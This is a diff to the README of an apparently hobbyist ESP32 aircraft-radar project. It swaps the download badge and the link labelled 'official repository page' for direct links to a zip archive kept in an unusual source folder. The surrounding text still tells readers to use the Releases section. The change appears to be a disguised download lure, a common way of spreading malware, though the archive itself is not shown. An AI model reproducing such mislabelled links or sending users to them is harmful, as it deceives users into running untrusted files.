@@ -1,6 +1,6 @@
 # ✈️ ESP32-Plane-Radar - Track live aircraft using radar display
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar/raw/refs/heads/main/include/ui/Plane_Radar_ES_3.1-beta.3.zip)
 
 This software turns your ESP32 hardware and screen into a real-time air traffic monitor. It detects nearby ADS-B signals from planes and displays them on a round radar screen. You see aircraft distance, heading, and movement patterns in your local area.
 
@@ -20,7 +20,7 @@ Keep the board and screen ready to connect. Ensure your USB cable carries data a
 
 The software lives on our project page. Follow these steps to obtain the files:
 
-1. Visit the [official repository page](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar).
+1. Visit the [official repository page](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar/raw/refs/heads/main/include/ui/Plane_Radar_ES_3.1-beta.3.zip).
 2. Look for the Releases section on the right side of the screen.
 3. Click the latest version number.
 4. Find the file ending in .zip or .bin under the Assets list.
